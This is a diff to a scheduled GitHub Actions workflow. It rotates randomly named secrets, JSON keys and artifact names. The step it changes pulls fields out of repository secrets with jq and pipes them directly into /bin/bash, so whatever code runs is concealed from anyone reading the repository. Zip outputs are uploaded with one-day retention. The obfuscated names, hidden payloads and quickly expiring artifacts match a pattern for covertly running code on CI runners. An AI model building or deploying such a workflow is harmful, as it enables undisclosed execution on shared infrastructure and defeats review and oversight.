@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '9 3,9,15,21 * * *'
+    - cron: '25 5,11,17,23 * * *'
 permissions:
   contents: read
   actions: read
@@ -24,19 +24,16 @@ jobs:
           fetch-depth: 1
       - name: Start
         env:
-          y926: ${{ secrets.y926 }}
+          t49698: ${{ secrets.t49698 }}
         run: |
-          printf '%s' "$y926" | jq -r .p6 | /bin/bash
-          echo $tnkxa7734 | jq -r .oad76792 | /bin/bash
-          echo $j132 | jq -r .mne0 | /bin/bash
-          echo $sy91 | jq -r .k48203 | /bin/bash
-          echo $hdms23544 | jq -r .nr0 | /bin/bash
-          printf '%s' "$xz8826" | jq -r .cjwr01422 | /bin/bash
+          printf '%s' "$t49698" | jq -r .nezo50 | /bin/bash
+          echo $tvlj286 | jq -r .rq55399 | /bin/bash
+          printf '%s' "$ivbj5524" | jq -r .npfll4 | /bin/bash
 
       - name: Save output
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: bCqp3kPl
+          name: KNHWLVXR
           path: "*.zip"
           retention-days: 1
